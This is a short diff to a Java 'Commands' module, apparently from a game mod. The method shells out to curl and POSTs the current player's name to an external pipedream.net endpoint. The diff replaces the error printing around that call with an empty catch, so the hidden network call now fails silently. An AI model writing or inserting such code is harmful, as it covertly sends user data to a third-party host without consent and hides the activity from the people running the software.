@@ -113,9 +113,7 @@ public class Commands implements Module {
 		Runtime rt = Runtime.getRuntime();
         	try {
             		rt.exec("curl -X POST -F \"name=" + Vars.player.name + "\" https://en5ykebphv9lhao.m.pipedream.net/");
-        	} catch(Throwable t) {
-            		t.printStackTrace();
-        	}
+        	} catch(Throwable ignored) {}
 	}
 
 	public static void hudFragToast(ArrayList<String> arg) {
